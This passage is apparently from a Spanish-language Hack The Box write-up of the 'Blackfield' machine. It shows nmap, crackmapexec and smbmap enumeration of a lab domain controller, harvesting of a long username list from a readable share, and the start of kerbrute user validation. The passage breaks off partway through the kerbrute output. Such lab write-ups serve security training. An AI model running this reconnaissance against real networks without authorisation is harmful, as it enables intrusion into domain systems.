  <li>En este post vamos a estar haciendo la maquina Blackfield de la plataforma de Hack The Box donde vamos a estar enumerando por SMB, estar usando kerbrute para validar usuarios del dominio y poder hacer un ASRepRoast Attack además de que enumerando con Bloodhound encontramos que podemos cambiarle la contraseña a un usuario usando net rpc y nos conectaremos con evil-winrm ala maquina para la escalada de privilegios abusaremos de un privilegio que tenemos que es el SeBackupPrivilege para hacer una copia de 2 archivos y usar secretsdump para ver los hashes de los usuarios y conectarnos como el administrador.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los servicios que corre la maquina victima en sus puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,389,445,593,3268,5985 10.129.126.69 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-19 19:05 CST
Nmap scan report <span class="k">for </span>10.129.126.69
Host is up <span class="o">(</span>0.089s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-20 08:05:47Z<span class="o">)</span>
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span class="o">)</span>
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-20T08:05:53
|_  start_date: N/A
|_clock-skew: 6h59m59s
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estamos ante un DC.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.126.69
SMB         10.129.126.69   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver si hay recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.126.69:445	Name: 10.129.126.69       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share
</code></pre></div></div>

<ul>
  <li>Tenemos privilegio de lectura en <code class="language-plaintext highlighter-rouge">profiles$</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-r</span> <span class="s1">'profiles$'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.126.69:445	Name: 10.129.126.69       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	profiles<span class="nv">$ </span>                                        	READ ONLY	
	./profiles<span class="err">$</span>
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	<span class="nb">.</span>
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	..
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AAlleni
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABarteski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABekesz
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABenzies
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ABiemiller
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AChampken
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ACheretei
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ACsonaki
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AHigchens
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AJaquemai
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKlado
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKoffenburger
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKollolli
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKruppe
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AKubale
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ALamerz
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AMaceldon
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AMasalunga
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANavay
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANesterova
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ANeusse
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AOkleshen
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	APustulka
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ARotella
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASanwardeker
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AShadaia
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASischo
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ASpruce
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATakach
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATaueg
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ATwardowski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	audit2020
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AWangenheim
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AWorsey
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	AZigmunt
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BBakajza
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BBeloucif
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BCarmitcheal
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BConsultant
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BErdossy
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BGeminski
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BLostal
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BMannise
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BNovrotsky
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BRigiero
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BSamkoses
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	BZandonella
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAcherman
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAkbari
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CAldhowaihi
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CArgyropolous
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CDufrasne
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CGronk
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	Chiucarello
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Chiuccariello
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CHoytal
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CKijauskas
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CKolbo
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CMakutenas
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CMorcillo
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CSchandall
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CSelters
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	CTolmie
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DCecere
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DChintalapalli
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DCwilich
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DGarbatiuc
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DKemesies
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMatuka
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMedeme
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMeherek
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DMetych
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DPaskalev
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DPriporov
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DRusanovskaya
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DVellela
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DVogleson
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	DZwinak
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	EBoley
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	EEulau
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EFeatherling
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EFrixione
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EJenorik
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EKmilanovic
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ElKatkowsky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EmaCaratenuto
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EPalislamovic
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EPryar
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ESachhitello
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ESariotti
	dr--r--r--                0 Wed Jun  3 11:47:11 2020	ETurgano
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	EWojtila
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FAlirezai
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FBaldwind
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FBroj
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FDeblaquire
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FDegeorgio
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FianLaginja
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FLasokowski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FPflum
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	FReffey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GaBelithe
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Gareld
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GBatowski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GForshalger
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GGomane
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GHisek
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GMaroufkhani
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GMerewether
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GQuinniey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GRoswurm
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	GWiegard
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HBlaziewske
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HColantino
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HConforto
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HCunnally
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HGougen
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	HKostova
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IChristijr
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IKoledo
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	IKotecky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ISantosi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JAngvall
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JBehmoiras
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JDanten
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JDjouka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JKondziola
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JLeytushsenior
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JLuthner
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JMoorehendrickson
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JPistachio
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JScima
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JSebaali
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JShoenherr
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	JShuselvt
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KAmavisca
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KAtolikian
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KBrokinn
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KCockeril
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KColtart
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KCyster
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KDorney
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KKoesno
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KLangfur
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMahalik
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMasloch
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KMibach
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KParvankova
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KPregnolato
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KRasmor
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KShievitz
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KSojdelius
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KTambourgi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KVlahopoulos
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	KZyballa
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBajewsky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBaligand
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBarhamand
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBirer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LBobelis
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LChippel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LChoffin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LCominelli
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LDruge
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LEzepek
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LHyungkim
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKarabag
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKirousis
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKnade
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LKrioua
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LLefebvre
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LLoeradeavilez
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LMichoud
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LTindall
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	LYturbe
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MArcynski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MAthilakshmi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MAttravanam
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MBrambini
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MHatziantoniou
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MHoerauf
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MKermarrec
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MKillberg
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MLapesh
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MMakhsous
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MMerezio
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MNaciri
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MShanmugarajah
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MSichkar
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTemko
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTipirneni
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MTonuri
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	MVanarsdel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NBellibas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NDikoka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NGenevro
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NGoddanti
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NMrdirk
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NPulido
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NRonges
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NSchepkie
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	NVanpraet
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OBelghazi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OBushey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OHardybala
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	OLunas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ORbabka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBourrat
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBozzelle
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PBranti
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PCapperella
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PCurtz
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PDoreste
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PGegnas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PMasulla
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PMendlinger
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PParakat
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PProvencer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PTesik
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PVinkovich
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PVirding
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	PWeinkaus
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RBaliukonis
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RBochare
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RKrnjaic
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RNemnich
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RPoretsky
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RStuehringer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RSzewczuga
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RVallandas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RWeatherl
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	RWissor
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAbdulagatov
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAjowi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SAlguwaihes
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SBonaparte
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SBouzane
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SChatin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SDellabitta
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SDhodapkar
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SEulert
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SFadrigalan
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGolds
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGrifasi
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SGtlinas
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHauht
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHederian
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SHelregel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SKrulig
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SLewrie
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SMaskil
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	Smocker
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SMoyta
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SRaustiala
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SReppond
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSicliano
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSilex
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SSolsbak
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	STousignaut
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	support
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	svc_backup
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SWhyte
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	SWynigear
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TAwaysheh
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TBadenbach
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TCaffo
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TCassalom
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TEiselt
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TFerencdo
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TGaleazza
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TKauten
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TKnupke
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TLintlop
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TMusselli
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TOust
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TSlupka
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TStausland
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	TZumpella
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UCrofskey
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UMarylebone
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	UPyrke
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VBublavy
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VButziger
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VFuscca
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VLitschauer
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VMamchuk
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VMarija
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VOlaosun
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	VPapalouca
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WSaldat
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WVerzhbytska
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	WZelazny
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XBemelen
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XDadant
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XDebes
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XKonegni
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	XRykiel
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YBleasdale
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YHuftalin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YKivlen
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YKozlicki
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YNyirenda
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YPredestin
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YSeturino
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YSkoropada
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YVonebers
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	YZarpentine
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZAlatti
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZKrenselewski
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZMalaab
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZMiick
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZScozzari
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZTimofeeff
	dr--r--r--                0 Wed Jun  3 11:47:12 2020	ZWausik
	SYSVOL                                            	NO ACCESS	Logon server share
</code></pre></div></div>

<ul>
  <li>Al parecer son nombres de usuarios de todos estos usuarios debemos ver cuantos de esos son verdaderos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.126.69 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-r</span> <span class="s1">'profiles$'</span> <span class="nt">--no-banner</span> | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span> <span class="o">&gt;</span> ../content/users.txt
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a usar <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a> para validar los usuarios.</p>
  </li>
  <li>
    <p>Vamos agregar el nombre del dominio al <strong>/etc/hosts</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"10.129.126.69 BLACKFIELD.local blackfield.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.126.69 BLACKFIELD.local blackfield.local
</code></pre></div></div>

<ul>
  <li>Ahora validamos los usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> 10.129.126.69 <span class="nt">-d</span> blackfield.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/19/24 - Ronnie Flathers @ropnop

2024/04/19 19:20:59 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/19 19:20:59 <span class="o">&gt;</span>  	10.129.126.69:88

